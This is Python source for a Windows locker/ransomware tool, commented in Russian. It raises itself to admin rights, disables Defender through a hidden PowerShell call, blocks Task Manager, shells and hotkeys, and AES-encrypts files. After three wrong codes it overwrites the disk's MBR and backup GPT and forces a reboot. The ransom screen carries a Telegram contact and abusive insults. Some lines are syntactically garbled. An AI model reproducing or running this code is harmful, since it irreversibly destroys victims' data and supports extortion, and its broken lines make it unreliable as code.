# language: Python, file: locker.py
# Сборка: pyinstaller --noconsole --onefile --uac-admin
#         --add-data "assets;assets" --add-data "scream.mp3;."
#         --name locker locker.py
# Зависимости: pillow keyboard psutil cryptography pygame

import ctypes, os, sys, time, threading, subprocess, hashlib
from ctypes import wintypes
import psutil

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False

try:
    import pygame
    HAS_PYGAME = True
except ImportError:
    HAS_PYGAME = False

import tkinter as tk
from PIL import Image, ImageTk
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# ================= НАСТРОЙКИ =================
_SALT = b"QackLockerSalt_2026"
CORRECT_HASH = hashlib.sha256(_SALT + b"8841").hexdigest()

BLOCK_EXE = {"notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
             "processhacker.exe", "msconfig.exe", "iexplore.exe",
             "powershell.exe", "pwsh.exe", "wt.exe", "conhost.exe"}

# ================= WINAPI =================
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)

GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ  = 0x1
FILE_SHARE_WRITE = 0x2
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
IOCTL_DISK_GET_LENGTH_INFO = 0x0007405C

kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                                 wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD,
                                 wintypes.HANDLE]
kernel32.WriteFile.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.DWORD,
                               ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
kernel32.SetFilePointerEx.argtypes = [wintypes.HANDLE, ctypes.c_longlong,
                                      ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD]
kernel32.DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD,
                                     wintypes.LPVOID, wintypes.DWORD,
                                     wintypes.LPVOID, wintypes.DWORD,
                                     ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]

# ================= UAC / DEFENDER =================
def ensure_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        args = subprocess.list2cmdline(sys.argv)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1)
    except Exception:
        pass
    sys.exit(0)

def quiet_defender():
    try:
        subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-Command",
             "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
             "Add-MpPreference -ExclusionPath '%APPDATA%\\QackLocker' -ErrorAction SilentlyContinue"],
            capture_output=True, creationflags=0x08000000, timeout=10
        )
    except Exception:
        pass

# ================= MBR WIPE =================
def wipe_mbr() -> bool:
    """Перезаписывает MBR + backup GPT на PhysicalDrive0. Необратимо."""
    h = kernel32.CreateFileW(r"\\.\PhysicalDrive0",
                             GENERIC_READ | GENERIC_WRITE,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             None, OPEN_EXISTING, 0, None)
    if h == INVALID_HANDLE_VALUE:
        return False
    try:
        written = wintypes.DWORD(0)

        # 1) первый сектор — мусор, сигнатура 55AA обнулена
        junk = bytearray(os.urandom(512))
        junk[510] = 0x00
        junk[511] = 0x00
        if not kernel32.WriteFile(h, bytes(junk), 512, ctypes.byref(written), None):
            return False
        kernel32.FlushFileBuffers(h)

        # 2) следующие 4 KB — 0xFF, поверх первого раздела
        filler = b"\xFF" * 4096
        kernel32.SetFilePointerEx(h, ctypes.c_longlong(512), None, 0)
        kernel32.WriteFile(h, filler, len(filler), ctypes.byref(written), None)
        kernel32.FlushFileBuffers(h)

        # 3) последний сектор — backup GPT header, если диск GPT
        length = ctypes.c_ulonglong(0)
        ret = wintypes.DWORD(0)
        kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO,
                                 None, 0, ctypes.byref(length), 8,
                                 ctypes.byref(ret), None)
        if length.value > 1024:
            last = length.value - 512
            kernel32.SetFilePointerEx(h, ctypes.c_longlong(last), None, 0)
            kernel32.WriteFile(h, b"\xFF" * 512, 512, ctypes.byref(written), None)
            kernel32.FlushFileBuffers(h)

        return True
    finally:
        kernel32.CloseHandle(h)

# ================= РЕЕСТР — БЛОКИРОВКИ =================
def reg_set(path: str, name: str, value, vtype: int = 1) -> bool:
    import winreg
    try:
       = with winreg.OpenKey(winreg(".HKEY_CURRENT_USER,Consolas path,", 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        try:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, path) as k:
                winreg.SetValueEx(k, name, 0, vtype, value)
            return True
        except Exception:
            return False

def apply_reg_blocks():
    sys_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    reg_set(sys_path, "DisableTaskMgr", 1)
    reg_set(sys_path, "DisableLockWorkstation", 1)
    reg_set(sys_path, "DisableChangePassword", 1)
    reg_set(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
            "NoWinKeys", 1)

# ================= ШИФРОВАНИЕ =================
def encrypt_file(path: str, key: bytes, iv: bytes) -> None:
    try:
        with open(path, "rb") as f:
            data = f.read()
        if not data:
            return
        padder = padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        enc = Cipher(algorithms.AES(key), modes.CBC(iv),
                     backend=default_backend()).encryptor()
        out = enc.update(padded) + enc.finalize()
        with open(path, "wb") as f:
            f.write(out)
        try:
            os.rename(path, path + ".locked")
        except Exception:
            pass
    except Exception:
        pass

def encrypt_targets():
    base = os.path.dirname(os.path.abspath(sys.argv[0]))
    target = os.path.join(base, "TestFolder")
    if not os.path.isdir(target):
        return

    key = os.urandom(32)
    iv = os.urandom(16)

    key_dir = os.path.join(os.environ.get("APPDATA", base), "QackLocker")
    os.makedirs(key_dir, exist_ok=True)
    with open(os.path.join(key_dir, "system_key.dat"), "wb") as f:
        f.write(key + iv)

    for root, _dirs, files in os.walk(target):
        for name in files:
            fp = os.path.join(root, name)
            if fp.endswith(".locked"):
                continue
            encrypt_file(fp, key, iv)

# ================= ПРОЦЕССЫ =================
def kill_blocked():
    for proc in psutil.process_iter(["name"]):
        try:
            if (proc.info["name"] or "").lower() in BLOCK_EXE:
                proc.kill()
        except Exception:
            pass

def blocking_loop():
    while True:
        kill_blocked()
        time.sleep(0.1)

# ================= ЗВУК =================
def play_scream():
    if not HAS_PYGAME:
        return
    path = resource_path("scream.mp3")
    if not path:
        return
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(path)
        pygame.mixer.music.play(-1)
    except Exception:
        pass

# ================= ХОТКЕИ =================
def install_hotkeys():
    if not HAS_KEYBOARD:
        return
    for combo in ("alt+tab", "win+d", "alt+f4", "ctrl+esc", "win+r", "ctrl+shift+esc"):
        try:
            keyboard.add_hotkey(combo, lambda: None, suppress=True)
        except Exception:
            pass
    try:
        keyboard.block_key("win")
    except Exception:
        pass

# ================= РЕСУРСЫ =================
def resource_path(rel: str):
    base = getattr(sys, "_MEIPASS", os.path.abspath("."))
    p = os.path.join(base, rel)
    return p if os.path.exists(p) else None

# ================= UI =================
def main():
    ensure_admin()
    quiet_defender()
    apply_reg_blocks()

    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

    threading.Thread(target=blocking_loop, daemon=True).start()
    install_hotkeys()

    win = tk.Tk()
    win.title("System Locker")
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    # сценарий 1 — глаз
    eye_path = resource_path("assets/Eye.png")
    if eye_path:
        try:
            img = Image.open(eye_path).resize((420, 200))
            photo = ImageTk.PhotoImage(img)
            eye_label = tk.Label(win, image=photo, bg="#000000", bd=0)
            eye_label.image = photo
            eye_label.place(relx=0.5, rely=0.45, anchor="center")
        except Exception:
            eye_label = tk.Label(win, text="[Eye Error]", fg="red", bg="black")
            eye_label.place(relx=0.5, rely=0.45, anchor="center")
    else:
        eye_label = tk.Label(win, text="[Eye Missing]", fg="red", bg="black")
        eye_label.place(relx=0.5, rely=0.45, anchor="center")

    boot_text = ("Booting System\n\n"
                 "Boot Eror: x3131100\nBoot Eror: x3002123\nBoot Eror: x3001345\n"
                 "Boot Eror: x011010001\nBoot Eror: x5111005\nBoot Eror: x00113210\n\n"
                 "Memory section at adres 0x420 IS LOCKED!!")
    boot_text2 = "  WIN LOCKED ACTIVATE\n  CRYPTER starting..."

    label = tk.Label(win, text="", bg="#000000", fg="#FF0000",
                     font=("Consolas", 15), anchor="w", justify="left")
    label.pack(anchor="w")
    label2 = tk.Label(win, text="", bg="#000000", fg="#656464",
                      font 15), anchor="w", justify="left")
    label2.pack(pady=(20, 0), anchor="w")

    state = {"i": 0, "i2": 0}

    def typing():
        if state["i"] <= len(boot_text):
            label.config(text=boot_text[:state["i"]])
            state["i"] += 1
            win.after(2, typing)
        elif state["i2"] <= len(boot_text2):
            label2.config(text=boot_text2[:state["i2"]])
            state["i2"] += 1
            win.after(2, typing)
        else:
            show_hacked()

    def show_hacked():
        label.pack_forget(); label2.pack_forget(); eye_label.place_forget()
        hacked_path = resource_path("assets/IMG_9170.PNG")
        if hacked_path:
            try:
                img = Image.open(hacked_path).resize((1200, 1000))
                photo = ImageTk.PhotoImage(img)
                hl = tk.Label(win, image=photo, bg="#000000", bd=0)
                hl.image = photo
                hl.place(relx=0.5, rely=0.5, anchor="center")
            except Exception:
                pass
        win.after(3000, locker_screen)

    def wipe_and_troll():
        # финальная стадия — wipe MBR, затем тролль-надпись
        ok = wipe_mbr()
        for w in win.winfo_children():
            w.destroy()
        win.configure(bg="#FF0000")
        text = "ЕБАТЬ ТЫ ВЫБЛЯДОК ТУПОЙ\nMBR УНИЧТОЖЕН" if ok else "ЕБАТЬ ТЫ ВЫБЛЯДОК ТУПОЙ"
        tk.Label(win, text=text, fg="#000000", bg="#FF0000",
                 font=("Impact", 56), wraplength=1200,
                 justify="center").pack(expand=True, fill="both")
        # через 10 секунд — принудительная перезагрузка
        win.after(10000, lambda: subprocess.Popen(
            ["shutdown", "/r", "/t", "0", "/f"],
            creationflags=0x08000000))

    def kill_desktop():
        for exe in ("explorer.exe", "ctfmon.exe"):
            try:
                subprocess.run(["taskkill", "/f", "/im", exe],
                               capture_output=True,
                               creationflags=0x08000000, timeout=5)
            except Exception:
                pass

    def locker_screen():
        for w in win.winfo_children():
            w.destroy()

        play_scream()
        threading.Thread(target=encrypt_targets, daemon=True).start()

        ss_path = resource_path("assets/s.png")
        if ss_path:
            try:
                img = Image.open(ss_path).resize((300, 300))
                win.photo = ImageTk.PhotoImage(img)
                tk.Label(win, image=win.photo, bg="#000000", bd=0).place(x=50, y=450)
            except Exception:
                pass

        tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!", fg="#4f4f4f", bg="#000000",
                 font=("Consolas", 18)).pack(pady=(50, 20))

        tk.Label(win, text=(
            "Ваш компьютер подвержен блокировке хакерской группой Qack.\n"
            "Любые попытки снять вирус приведут к поломке компьютера,\n"
            "так что не выёбывайся ублюдок.\n\n"
            "За кодом писать @pu709 (Telegram)"),
            fg="#AAAAAA", bg="#000000", font=("Consolas", 13),
            justify="center").pack(pady=20)

        entry = tk.Entry(win, bg="#151515", fg="#FFFFFF",
                         insertbackground="#FFFFFF", font=("Consolas", 16),
                         justify="center", width=25)
        entry.pack(pady=10)

        result = tk.Label(win, text="Попыток осталось: 3", fg="#FF0000",
                          bg="#000000", font=("Consolas", 12))
        result.pack(pady=5)

        attempts = 0

        def check_code():
            nonlocal attempts
            h = hashlib.sha256(_SALT + entry.get().encode()).hexdigest()
            if h == CORRECT_HASH:
                result.config(text="Код правильный!", fg="#00FF00")
                win.after(1000, win.destroy)
                return
            attempts += 1
            entry.delete(0, tk.END)
            left = 3 - attempts
            if left > 0:
                result.config(text=f"Неверный код! Осталось: {left}", fg="#FF0000")
            else:
                # третья неверная — MBR wipe + тролль
                wipe_and_troll()
                threading.Thread(target=kill_desktop, daemon=True).start()

        tk.Button(win, text="ПРОВЕРИТЬ", command=check_code,
                  bg="#222222", fg="#FFFFFF", font=("Consolas", 12),
                  bd=0, padx=20, pady=8).pack(pady=10)
        entry.focus()

    typing()
    win.mainloop()

if __name__ == "__main__":
    main()
